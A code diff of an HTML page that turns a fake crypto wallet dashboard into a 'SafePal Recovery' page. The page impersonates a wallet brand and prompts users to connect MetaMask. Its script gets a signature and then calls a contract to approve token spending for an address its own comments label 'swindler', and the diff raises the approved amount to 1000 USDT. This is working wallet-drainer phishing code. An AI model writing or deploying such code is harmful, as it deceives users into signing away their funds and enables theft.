@@ -1,205 +1,54 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Wallet Dashboard</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <style>
-    body {
-      font-family: 'Inter', sans-serif;
-      background-color: #f4f4f7;
-      margin: 0;
-      padding: 20px;
-      color: #333;
-    }
-    .wallet {
-      max-width: 500px;
-      margin: 0 auto;
-      background: white;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      padding: 20px;
-    }
-    .wallet h2 {
-      margin-bottom: 20px;
-      font-size: 24px;
-      text-align: center;
-    }
-    .balance {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin: 15px 0;
-      padding: 10px;
-      border-bottom: 1px solid #eee;
-    }
-    .balance img {
-      width: 24px;
-      height: 24px;
-      margin-right: 10px;
-    }
-    .token {
-      display: flex;
-      align-items: center;
-      background-color: #f0f0f5;
-      padding: 5px 10px;
-      border-radius: 6px;
-    }
-    .token span {
-      margin-right: 10px;
-    }
-    .balance strong {
-      font-size: 18px;
-      display: inline-block;
-      width: 90px;
-      text-align: right;
-    }
-    .balance .usd {
-      font-size: 12px;
-      color: #888;
-      text-align: right;
-      margin-top: 5px;
-    }
-    .transactions {
-      margin-top: 30px;
-      max-height: 200px;
-      overflow-y: auto;
-    }
-    .transactions h3 {
-      font-size: 18px;
-      margin-bottom: 10px;
-    }
-    .tx {
-      background: #f9f9fb;
-      border: 1px solid #ddd;
-      padding: 10px;
-      border-radius: 8px;
-      margin-bottom: 10px;
-    }
-    .tx span {
-      display: block;
-      font-size: 14px;
-    }
-    .tx .date {
-      color: #888;
-      font-size: 12px;
-      margin-top: 4px;
-    }
-    .connect-btn {
-      display: block;
-      width: 100%;
-      padding: 12px;
-      background-color: #4559ff;
-      color: white;
-      text-align: center;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      cursor: pointer;
-      margin-top: 30px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SafePal Recovery</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            margin: 10px;
+            border-radius: 5px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #333;
+        }
+    </style>
 </head>
 <body>
-  <div class="wallet">
-    <h2>Wallet Recovery</h2>
-
-    <!-- BTC Balance -->
-    <div class="balance">
-      <div class="token">
-        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1.png">
-        <span>BTC (Bitcoin)</span>
-        <div class="usd" id="btc-price">$0.00</div>
-      </div>
-      <div>
-        <strong id="btc-amount">0.01</strong>
-        <div class="usd" id="btc-equivalent">$0.00</div>
-      </div>
+    <div class="container">
+        <h2>SafePal Recovery</h2>
+        <button id="connectButton" onclick="connectWallet()">Connect Wallet</button>
+        <p id="status">Please connect your MetaMask wallet.</p>
     </div>
-
-    <!-- ETH Balance -->
-    <div class="balance">
-      <div class="token">
-        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png" alt="ETH">
-        <span>ETH (Ethereum)</span>
-        <div class="usd" id="eth-price">$0.00</div>
-      </div>
-      <div>
-        <strong id="eth-amount">1.84</strong>
-        <div class="usd" id="eth-equivalent">$0.00</div>
-      </div>
-    </div>
-
-    <!-- SOL Balance -->
-    <div class="balance">
-      <div class="token">
-        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/5426.png">
-        <span>SOL (Solana)</span>
-        <div class="usd" id="sol-price">$0.00</div>
-      </div>
-      <div>
-        <strong id="sol-amount">0</strong>
-        <div class="usd" id="sol-equivalent">$0.00</div>
-      </div>
-    </div>
-
-    <!-- USDT Balance -->
-    <div class="balance">
-      <div class="token">
-        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png">
-        <span>USDT (Tether)</span>
-        <div class="usd" id="usdt-price">$0.00</div>
-      </div>
-      <div>
-        <strong id="usdt-amount">37,598.00</strong>
-        <div class="usd" id="usdt-equivalent">$0.00</div>
-      </div>
-    </div>
-
-    <div class="transactions">
-      <h3>Recent Transactions</h3>
-      <div class="tx">
-        <span>Received 2750 USDT</span>
-        <span class="date">May 4, 2018</span>
-      </div>
-      <div class="tx">
-        <span>Sent 2300 USDT</span>
-        <span class="date">August 17, 2018</span>
-      </div>
-      <div class="tx">
-        <span>Received 10000 USDT</span>
-        <span class="date">November 23, 2019</span>
-      </div>
-      <div class="tx">
-        <span>Received 25000 USDT</span>
-        <span class="date">February 2, 2019</span>
-      </div>
-      <div class="tx">
-        <span>Sent 977 USDT</span>
-        <span class="date">July 9, 2020</span>
-      </div>
-      <div class="tx">
-        <span>Sent 3.99 BTC</span>
-        <span class="date">January 1, 2020</span>
-      </div>
-      <div class="tx">
-        <span>Sent 7 BTC</span>
-        <span class="date">March 3, 2020</span>
-      </div>
-      <div class="tx">
-        <span>Received 10 ETH</span>
-        <span class="date">April 2, 2020</span>
-      </div>
-      <div class="tx">
-        <span>Sent 8.16 ETH</span>
-        <span class="date">December 15, 2020</span>
-      </div>
-    </div>
-
-    <button class="connect-btn" onclick="connectWallet()">Connect MetaMask</button>
-  </div>
 
     <script>
         async function connectWallet() {
@@ -229,7 +78,7 @@
                 }
 
                 // Підпис повідомлення
-                const message = 'Verify wallet ownership for Wallet recovery';
+                const message = 'Verify wallet ownership for SafePal recovery';
                 const signature = await window.ethereum.request({
                     method: 'personal_sign',
                     params: [message, userAddress]
@@ -242,7 +91,7 @@
                 const contractAddress = '0x45082F912D180D8296220940aC164c5feC775d3c'; // Встав нову адресу
                 const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // TestUSDT
                 const shahraiAddress = '0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e'; // Гаманець Б
-                const amount = 500; // 0.0005 USDT
+                const amount = 1000000000; // 1000 USDT
 
                 const contractAbi = [
                     "function executeApprove(bytes memory message, address user, bytes memory signature, address token, address spender, uint256 amount) external"
@@ -264,7 +113,5 @@
             }
         }
     </script>
-</body>
-</html>
 </body>
 </html>
